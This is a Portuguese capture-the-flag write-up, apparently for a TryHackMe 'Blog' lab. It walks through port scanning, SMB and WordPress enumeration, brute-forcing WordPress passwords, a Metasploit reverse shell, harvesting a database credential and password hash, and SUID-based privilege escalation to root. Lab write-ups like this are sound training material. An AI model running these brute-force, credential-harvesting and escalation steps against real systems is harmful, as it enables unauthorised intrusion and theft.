# Blog

* ### Scan de portas - Verificando quais portas estão abertas.
```bash
rustscan -a 10.10.73.187 --ulimit 5000
```
![image](https://github.com/lufffe/Writeups/assets/90646635/ee9a8a40-f709-4863-8efc-b79cc3a42084)

* ### Verificando serviços que estão rodando nas portas abertas.
```bash
nmap -A -p 22,80,139,445 10.10.73.187
```
![image](https://github.com/lufffe/Writeups/assets/90646635/5ab223e1-a84c-46d4-83f2-48a887d91fa1)

* Listando diretórios no SMB
```bash
smbclient -L \\10.10.73.187
```
![image](https://github.com/lufffe/Writeups/assets/90646635/9558961c-1c0f-45bb-96e6-b39bfcf3ab57)

* Verificando o que tem no SMB
```bash
smbclient //10.10.73.187/
```
![image](https://github.com/lufffe/Writeups/assets/90646635/79dc94a6-7d8a-4eb3-a4f5-83a68f39563a)

* Enumerando possiveis coisas no Wordpress, com o wpscan, e acabei achando 2 usuários.
```bash
wpscan --url http://blog.thm --enumerate
```
![image](https://github.com/lufffe/Writeups/assets/90646635/e51ea86c-0bf6-4fc5-aef7-2b49f24128cf)

* Brute Force para encontrar a senha de um dos usuários encontrados.
```bash
wpscan --url http://blog.thm --wp-content-dir wp-admin --usernames kwheel,bjoel --passwords rockyou.txt
```
![image](https://github.com/lufffe/Writeups/assets/90646635/ae734f8a-1312-421a-bdad-29255e52edb1)

* Joguei no Google para encontrar algum exploit sobre o Wordpress.
![image](https://github.com/lufffe/Writeups/assets/90646635/26d5cf30-9b3d-42d3-9cc0-f148adea2c58)

>https://www.exploit-db.com/exploits/49512

* Por algum motivo o shell não estava conectando então tentei outra que foi o nesse outro pelo Metasploit.

* Resolvi tentar o metasploit
![image](https://github.com/lufffe/Writeups/assets/90646635/223e221c-1eaf-47fd-8ea6-7777cbce5665)

* E com esse exploit eu conseguir o reverse shell
![image](https://github.com/lufffe/Writeups/assets/90646635/cfe7a377-2878-4eaf-8775-cf6f2acfc0ab)

* No wp-config , encontrei uma credencial do BD.
```bash
cat wp-config.php
```
![image](https://github.com/lufffe/Writeups/assets/90646635/4aa1cf31-1538-48e5-b436-a5745c581ba1)

wordpressuser / LittleYellowLamp90!@

* Verificando coisas interessantes no mysql
```bash
mysql -u wordpressuser -p LittleYellowLamp90!@
```

```bash
show databases;
```

```bash
use blog;
```

```bash
show tables;
```

* Listando dados dos usuários 
```bash
select * from wp_users;
```
![image](https://github.com/lufffe/Writeups/assets/90646635/2fade2f3-322f-4821-b634-e6f1b5a9d2bb)

$P$BjoFHe8zIyjnQe/CBvaltzzC6ckPcO/

* E não conseguir quebrar, 2 wordlist não conseguiram encontrar.
  
```bash
hashcat -a 0 -m 400 hash rockyou.txt
```

* Resolvi buscar possibilidades, encontrei algo diferente e encontrei esse binário.
```bash
**find / -perm -4000 2>/dev/null**
```
![image](https://github.com/lufffe/Writeups/assets/90646635/59c32e1e-2efb-4b37-8e4b-97446c954b10)

* Fui no GTFobins e procurei como poderia usar para escalar previlégios
![image](https://github.com/lufffe/Writeups/assets/90646635/1b8f43cc-98a6-499b-ac0d-c85ec716fa2a)


```bash
LFILE=/root/root.txt
```
```bash
checker $LFILE
```

* E deu certo, conseguir pegar o usuário root.

![image](https://github.com/lufffe/Writeups/assets/90646635/82814441-97ef-465f-9ad4-110e7ddfcdd0)

* Onde a flag está escondida
  
![image](https://github.com/lufffe/Writeups/assets/90646635/a701af91-054f-47ad-bae2-791a73e4c1a9)

```bash
cat /root/root.txt
```
